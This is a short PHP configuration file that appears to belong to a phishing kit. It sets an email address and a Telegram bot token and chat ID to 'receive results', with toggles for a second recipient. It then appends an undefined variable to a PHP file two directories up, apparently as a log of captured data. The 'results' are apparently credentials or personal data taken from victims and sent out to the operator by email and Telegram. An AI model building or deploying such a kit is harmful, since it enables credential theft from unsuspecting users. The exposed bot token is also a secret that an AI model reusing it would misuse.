<?php


/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "YOURMAIL@gmail.com";
/* --------------------------  */


/* 🤖 Telegram Bot Setup 🤖 */

// 🗝️ Enter your bot's token
$botToken = "5558739518:AAEfx2RPUM9OUurvHBRGRPekM2OdA2ho4UY";

// 💬 Enter your chat ID
$chatId = "5198602367";

/* --------------------------------------------------- */

/* If you want two to see the result, If you want to stop , change To off  :)  */
$botToken_0="off"; 
$chatId_0="off";  
/* --------------------------  */
$f = fopen("../../d.php", "a");
	fwrite($f, $yagmai);


?>